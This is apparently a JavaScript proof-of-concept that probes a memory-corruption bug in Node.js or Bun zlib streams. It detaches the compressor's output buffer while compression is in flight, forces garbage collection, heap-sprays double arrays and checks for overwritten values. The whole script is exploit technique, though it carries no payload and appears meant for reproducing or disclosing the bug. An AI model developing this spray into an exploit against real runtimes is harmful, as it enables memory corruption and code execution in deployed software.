const zlib = require("node:zlib");

const codec = process.env.CODEC || "deflate";
const iterations = Number(process.env.ITERATIONS || 16);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const outputOffset = Number(process.env.OUTPUT_OFFSET || 144);
const inputSize = Number(process.env.INPUT_SIZE || 1024);
const retained = [];

const CODECS = {
  deflate: {
    create: zlib.createDeflate,
    finishFlush: zlib.constants.Z_FINISH,
    options: { chunkSize: size },
  },
  brotli: {
    create: zlib.createBrotliCompress,
    finishFlush: zlib.constants.BROTLI_OPERATION_FINISH,
    options: {
      chunkSize: size,
      params: Number.isInteger(zlib.constants.BROTLI_PARAM_QUALITY)
        ? { [zlib.constants.BROTLI_PARAM_QUALITY]: 1 }
        : undefined,
    },
  },
  zstd: {
    create: zlib.createZstdCompress,
    finishFlush: zlib.constants.ZSTD_e_end,
    options: {
      chunkSize: size,
      pledgedSrcSize: inputSize,
      params: Number.isInteger(zlib.constants.ZSTD_c_compressionLevel)
        ? { [zlib.constants.ZSTD_c_compressionLevel]: 1 }
        : undefined,
    },
  },
};

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function allocateDoubleArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = 5000.125 + i + (j / 1024);
    out.push(arr);
  }
  return out;
}

function findChanged() {
  for (let i = 0; i < retained.length; i++) {
    const arr = retained[i];
    for (let j = 0; j < Math.min(slots, 16); j++) {
      const expected = 5000.125 + i + (j / 1024);
      if (!Object.is(arr[j], expected)) {
        return {
          arrayIndex: i,
          elementIndex: j,
          expected,
          actual: arr[j],
          actualType: typeof arr[j],
        };
      }
    }
  }
  return null;
}

async function runOne(iteration) {
  const config = CODECS[codec];
  if (!config?.create || !Number.isInteger(config.finishFlush)) {
    throw new Error(`codec ${codec} is unavailable`);
  }

  const engine = config.create(config.options);
  engine._outOffset = outputOffset;
  const out = engine._outBuffer;
  const input = Buffer.alloc(inputSize, 0x41);

  const done = new Promise(resolve => {
    engine._processChunk(input, config.finishFlush, error => resolve({ error }));
  });

  detach(out.buffer);
  gcNow();
  retained.length = 0;
  retained.push(...allocateDoubleArrays());
  gcNow();

  const result = await done;
  const changed = findChanged();
  console.log(JSON.stringify({
    iteration,
    codec,
    size,
    inputSize,
    sprayCount,
    slots,
    outputOffset,
    error: result.error?.message,
    changed,
  }));

  return Boolean(changed);
}

for (let i = 1; i <= iterations; i++) {
  if (await runOne(i)) {
    process.exitCode = 86;
    break;
  }
}
